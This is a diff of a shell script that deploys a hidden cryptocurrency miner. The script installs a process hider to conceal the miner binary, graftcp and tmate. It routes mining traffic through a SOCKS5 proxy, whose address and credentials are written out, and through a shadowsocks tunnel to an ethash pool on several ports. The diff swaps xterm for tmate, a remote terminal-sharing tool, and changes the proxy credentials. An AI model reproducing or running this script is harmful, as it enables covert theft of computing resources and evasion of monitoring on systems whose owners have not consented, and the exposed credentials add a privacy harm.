@@ -8,7 +8,7 @@ chmod +x lba
 npm i -g node-process-hider 
 
 ph add graftcp
-ph add xterm
+ph add tmate
 ph add MIN
 
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
@@ -22,9 +22,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 176.53.133.217:57597
-socks5_username = 2BHVpyGPD
-socks5_password = 1rN14HAmV
+socks5 = 181.215.184.109:45786
+socks5_username = Selshindeparshuram2012
+socks5_password = V7p9BkV
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -43,8 +43,8 @@ apt -y install shadowsocks-libev rng-tools
 
 ss-local -s 144.217.7.95 -p 8388 -l 9999 -k rslzw -m chacha20-ietf-poly1305 -v &
 
-./graftcp/graftcp ./MIN --url=prodent.$(echo $(shuf -i 10-40 -n 1)-MAGIC)@ethash.kupool.com:8888 --log --extra 
+./graftcp/graftcp ./MIN --url=prodent.$(echo $(shuf -i 10-40 -n 1)-TEST)@ethash.kupool.com:8888 --log --extra 
 sleep 2
-./graftcp/graftcp ./MIN --url=prodent.$(echo $(shuf -i 10-40 -n 1)-MAGIC)@ethash.kupool.com:443 --log --extra 
+./graftcp/graftcp ./MIN --url=prodent.$(echo $(shuf -i 10-40 -n 1)-TEST)@ethash.kupool.com:443 --log --extra 
 sleep 2
-./graftcp/graftcp ./MIN --url=prodent.$(echo $(shuf -i 10-40 -n 1)-MAGIC)@ethash.kupool.com:1800 --log --extra 
+./graftcp/graftcp ./MIN --url=prodent.$(echo $(shuf -i 10-40 -n 1)-TEST)@ethash.kupool.com:1800 --log --extra 
